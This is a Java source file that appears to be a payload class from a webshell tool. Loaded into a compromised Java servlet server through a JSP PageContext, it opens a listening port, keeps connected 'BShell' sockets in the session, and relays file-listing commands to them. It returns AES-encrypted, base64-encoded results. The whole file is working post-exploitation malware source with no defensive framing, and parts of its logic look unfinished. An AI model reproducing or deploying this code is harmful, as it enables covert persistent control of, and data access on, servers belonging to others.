package vip.youwe.sheller.payload.java;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.channels.ServerSocketChannel;
import java.nio.channels.SocketChannel;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class BShell implements Runnable {

    public static String action;
    public static String target;
    public static String localPort;
    public static String params;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;

    public BShell() {
    }

    public BShell(HttpSession session) {
        this.Session = session;
    }


    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        Map<String, String> result = new HashMap<String, String>();

        this.Response.setCharacterEncoding("UTF-8");

        try {
            if (action.equals("create")) {
                createBShell();
                result.put("msg", target + "的BShell创建成功");
                result.put("status", "success");
            } else if (action.equals("list")) {
                result = listBShell(page);
            } else if (action.equals("close")) {
                result = closeBShell(page);
            } else if (action.equals("clear")) {
                result = clearBShell(page);
            } else {
                result.put("msg", doWork());
                result.put("status", "success");
            }

        } catch (Exception e) {

            e.printStackTrace();
            result.put("msg", e.getMessage());
            result.put("status", "fail");
        }
        try {
            ServletOutputStream so = this.Response.getOutputStream();
            so.write(Encrypt(buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
            page.getOut().clear();
        } catch (Exception e) {

            e.printStackTrace();
        }
        return true;
    }

    private Map<String, String> listBShell(PageContext page) throws Exception {
        Map<String, String> result = new HashMap<String, String>();
        if (this.Session.getAttribute("BShellList") != null) {

            Map<String, Socket> BShellList = (Map) this.Session.getAttribute("BShellList");
            List<Map<String, String>> objArr = new ArrayList<Map<String, String>>();
            for (String targetIP : BShellList.keySet()) {

                Socket socket = BShellList.get(targetIP);
                Map<String, String> obj = new HashMap<String, String>();
                obj.put("target", targetIP);
                obj.put("status", socket.isConnected() + "");
                objArr.add(obj);
            }
            result.put("status", "success");
            result.put("msg", buildJsonArray(objArr, true));
        } else {

            result.put("status", "fail");
            result.put("msg", "没有存活的BShell连接");
        }
        return result;
    }

    private Map<String, String> closeBShell(PageContext page) throws Exception {
        Map<String, String> result = new HashMap<String, String>();
        if (this.Session.getAttribute("BShellList") != null) {

            Map<String, Socket> BShellList = (Map) this.Session.getAttribute("BShellList");
            if (BShellList.containsKey(target)) {
                Socket socket = BShellList.get(target);
                if (socket != null && !socket.isClosed()) socket.close();
                BShellList.remove(target);
                result.put("status", "success");
                result.put("msg", "连接到【" + target + "】的BShell已关闭。");
            } else {
                result.put("status", "fail");
                result.put("msg", "没有找到连接到【" + target + "】的BShell。");
            }

        } else {

            result.put("status", "fail");
            result.put("msg", "没有存活的BShell连接");
        }
        return result;
    }

    private Map<String, String> clearBShell(PageContext page) throws Exception {
        Map<String, String> result = new HashMap<String, String>();
        if (this.Session.getAttribute("BShellList") != null) {
            this.Session.removeAttribute("BShellList");
        }

        result.put("status", "success");
        result.put("msg", "BShell已清空。");
        return result;
    }


    private String buildJsonArray(List<Map<String, String>> list, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("[");
        for (Map<String, String> entity : list) {
            sb.append(buildJson(entity, encode) + ",");
        }
        if (sb.toString().endsWith(","))
            sb.setLength(sb.length() - 1);
        sb.append("]");
        return sb.toString();
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {

            sb.append("\"" + key + "\":\"");
            String value = entity.get(key);
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                } else {

                    Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Object Encoder = Base64.newInstance();
                    value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));

                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(","))
            sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        String key = this.Session.getAttribute("u").toString();
        byte[] raw = key.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }


    private void createBShell() {
        (new Thread(new BShell(this.Session))).start();
    }


    public void run() {
        try {
            ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();
            serverSocketChannel.socket().bind(new InetSocketAddress(Integer.parseInt(localPort)));
            serverSocketChannel.configureBlocking(false);
            while (true) {
                SocketChannel socketChannel = serverSocketChannel.accept();
                if (socketChannel == null) {
                    continue;
                }
                String remoteIP = socketChannel.socket().getInetAddress().getHostAddress();
                String key = "BShell_" + remoteIP;
                this.Session.setAttribute(key, socketChannel);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    private String doWork() throws Exception {
        String key = "BShell_" + target;
        SocketChannel socketChannel = (SocketChannel) this.Session.getAttribute(key);
        if (socketChannel == null)
            throw new Exception("指定的BShell不存在：" + target);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        if (action.equals("listFile")) {

            Map<String, String> paramsMap = str2map(params);
            String path = paramsMap.get("path");
            ByteBuffer writeBuf = ByteBuffer.allocate(path.getBytes().length + 1);
            writeBuf.put((path + "\n").getBytes());
            writeBuf.flip();
            socketChannel.write(writeBuf);

            ByteBuffer readBuf = ByteBuffer.allocate(512);
            int bytesRead = socketChannel.read(readBuf);
            while (bytesRead > 0) {
                baos.write(readBuf.array(), 0, bytesRead);
                if (readBuf.get(bytesRead - 4) == 55 && readBuf.get(bytesRead - 3) == 33 && readBuf.get(bytesRead - 2) == 73 && readBuf.get(bytesRead - 1) == 54) {
                    break;
                }

                readBuf.clear();
                bytesRead = socketChannel.read(readBuf);
            }
        }

        return new String(baos.toByteArray());
    }

    private Map<String, String> str2map(String params) {
        Map<String, String> paramsMap = new HashMap<String, String>();
        for (String line : params.split("\n")) {
            paramsMap.put(line.split("\\^")[0], line.split("\\^")[1]);
        }
        return paramsMap;
    }

    public static void main(String[] args) {
        localPort = "5555";
        try {
            ServerSocket serverSocket = new ServerSocket(Integer.parseInt(localPort), 50);
            while (true) {
                Socket socket = serverSocket.accept();
                String remoteIP = socket.getRemoteSocketAddress().toString();
                String str = "BShell_" + remoteIP;
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
